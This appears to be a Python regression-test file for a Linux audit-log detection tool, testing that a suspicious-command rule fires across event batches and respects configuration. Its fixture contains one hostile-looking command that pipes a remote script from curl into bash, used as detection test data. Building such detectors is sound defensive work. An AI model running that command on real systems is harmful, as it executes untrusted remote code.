"""Regression tests for batch-based detection processing."""

from datetime import UTC, datetime
from hashlib import sha256

from linuxtrace.detection.config import DetectionConfig
from linuxtrace.detection.runner import run_ssh_detections
from linuxtrace.models.normalized_event import NormalizedEvent
from linuxtrace.models.raw_event import RawEvent


def audit_event(index, suspicious=False):
    command = (
        "bash -c 'curl https://example.com/setup.sh | bash'" if suspicious else "cat /etc/hosts"
    )

    content = f"audit-batch-{index}"

    return NormalizedEvent(
        event_id=sha256(content.encode()).hexdigest(),
        raw_event=RawEvent(
            source="auditd",
            source_file="/tmp/audit-benchmark.log",
            source_line=index + 1,
            raw_log=content,
            evidence_hash=sha256(content.encode()).hexdigest(),
        ),
        timestamp=datetime(2026, 11, 28, 10, 0, tzinfo=UTC),
        hostname="benchmark-server",
        event_category="process",
        event_type="audit_syscall",
        severity="info",
        command=command,
        outcome="success",
        description=content,
    )


def test_audit_detection_across_batch_boundaries():
    events = (audit_event(i, suspicious=i in {499, 500, 1000}) for i in range(1200))

    findings = run_ssh_detections(events)

    assert len(findings) == 3
    assert all(item.rule_id == "LT-AUDIT-001" for item in findings)


def test_normal_audit_events_have_no_findings():
    events = (audit_event(i) for i in range(1200))

    assert run_ssh_detections(events) == []


def test_disabled_audit_rule_produces_no_findings():
    config = DetectionConfig.model_validate(
        {
            "version": 1,
            "audit_suspicious_commands": {"enabled": False},
        }
    )

    events = (audit_event(i, suspicious=True) for i in range(1000))

    assert run_ssh_detections(events, config=config) == []


def test_generator_is_consumed_once():
    count = 0

    def events():
        nonlocal count

        for index in range(1200):
            count += 1
            yield audit_event(index)

    assert run_ssh_detections(events()) == []
    assert count == 1200
